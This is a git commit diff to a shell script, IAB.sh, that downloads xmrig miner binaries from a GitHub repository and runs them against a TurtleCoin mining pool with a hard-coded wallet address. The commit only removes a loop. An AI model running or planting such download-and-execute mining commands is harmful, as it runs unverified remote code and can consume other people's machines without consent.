7b34d18fd964b9a2d001b193f8205039f7566063
jeffthorne <jthorne@u.washington.edu>
2021-03-08 19:12:14 -0800

    test

--- IAB.sh
+++ IAB.sh
@@ -3,10 +3,8 @@
 echo "Getting Things Ready ...."
 wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
 wget https://github.com/jeffthorne/test/raw/main/xmrigMiner-O xmrigMiner
-while true
-echo "new"
-do
+
 chmod +X xmrigDaemon
 chmod +X xmrigMiner
 ./xmrigDaemon -o ca.turtlecoin.herominers.com:10380 -p x -k -u TRTLuzAyPPASGaxWJi4U7oJ9nEFVGkCcJVKoVyZuKyFJ88G1bjAtayJCBZ1cAdSJZgiDosGrFkcUbiLYFj7FUYdMMJaThJXhp92 --algo argon2/chukwav2
-done
+
